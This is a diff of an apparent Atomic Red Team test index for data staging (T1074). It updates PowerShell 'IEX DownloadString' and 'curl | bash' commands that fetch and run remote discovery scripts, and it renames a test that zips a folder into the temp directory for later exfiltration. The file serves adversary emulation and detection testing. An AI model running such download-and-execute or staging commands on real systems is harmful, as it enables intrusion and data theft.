@@ -25626,7 +25626,7 @@ collection:
       executor:
         name: powershell
         elevation_required: false
-        command: 'IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat'')
+        command: 'IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.bat'')
           > pi.log
 
 '
@@ -25640,12 +25640,13 @@ collection:
       - macos
       executor:
         name: bash
-        command: 'curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/Discovery.sh
+        command: 'curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.sh
           | bash -s > /tmp/discovery.log
 
 '
-    - name: Zip a Folder with PowerShell
-      description: 'use living off the land tools to encrypt and zip a file for exfiltration
+    - name: Zip a Folder with PowerShell for Staging in Temp
+      description: 'Use living off the land tools to zip a file and stage it in the
+        Windows temporary folder for later exfiltration.
 
 '
       supported_platforms:
@@ -25653,11 +25654,11 @@ collection:
       executor:
         name: powershell
         elevation_required: false
-        command: 'Compress-Archive -Path $PathToAtomicsFolder\T1074\bin\Folder_to_encrypt
-          -DestinationPath $env:TEMP\Folder_to_encrypt.zip
+        command: 'Compress-Archive -Path $PathToAtomicsFolder\T1074\bin\Folder_to_zip
+          -DestinationPath $env:TEMP\Folder_to_zip.zip
 
 '
-        cleanup_command: 'Remove-Item -Path $env:TEMP\Folder_to_encrypt.zip
+        cleanup_command: 'Remove-Item -Path $env:TEMP\Folder_to_zip.zip
 
 '
   '':
